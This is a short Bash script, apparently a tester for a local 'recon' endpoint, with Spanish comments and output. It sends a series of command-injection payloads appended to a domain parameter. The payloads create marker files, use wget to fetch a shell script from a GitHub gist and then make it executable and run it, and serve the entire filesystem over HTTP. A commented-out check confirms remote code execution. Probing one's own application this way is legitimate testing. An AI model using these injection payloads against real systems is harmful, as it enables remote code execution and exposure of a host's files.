#!/bin/bash
url="localhost:3000/recon?domain=example.com"
script="https://gist.githubusercontent.com/Skycstls/9fcf7888bf10e8b447338aebcb3ca687/raw/91c0d8f3bb79c1ddf4249c42d93e45997ab90f65/test.sh"
payloads=(
    ";touch%20./test"
    ";echo%20%22VULNERABLE%22%20%3E%20hacked"
    ";wget%20$script"
    ";chmod%20+x%20./test.sh"
    ";sh%20test.sh"
    ";python3%20-m%20http.server%20--directory%20/%20"
    "pkill%20-f%20'python3%20-m%20http.server'"
"
)
ending="&APIKEY=1234"

for payload in "${payloads[@]}"; do
    echo "Probando payload: $payload"
    response=$(curl -s -X POST "$url$payload$ending")
    echo "respuesta: $response"
done

function check_file {
    local file=$1
    if [ -f "$file" ]; then
        echo "El archivo $file existe. Hay una ejecución remota de código."
        rm "$file"
    else
        echo "El archivo $file no existe. No hay una ejecución remota de código."
    fi
}

echo "-------------"

#check_file "./test"
#check_file "./hacked"
#check_file "./test.sh"
#check_file "./hacked3.txt"